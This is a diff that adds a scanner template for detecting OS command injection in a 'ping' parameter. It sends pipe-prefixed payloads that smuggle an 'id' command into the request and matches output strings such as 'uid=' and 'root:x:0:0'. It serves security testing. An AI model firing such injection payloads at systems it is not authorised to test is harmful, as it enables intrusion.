@@ -1,0 +1,25 @@
+id: cmdi-010
+name: 'OS command injection via ping'
+severity: critical
+type: active
+tags:
+  - cmdi
+  - injection
+  - rce
+description: 'OS command runs via ping'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      ping:
+        - '%7Cid'
+        - '%7Cid #'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
+          - 'gid='
+          - 'root:x:0:0'
+          - 'bin/bash'
+          - 'www-data'
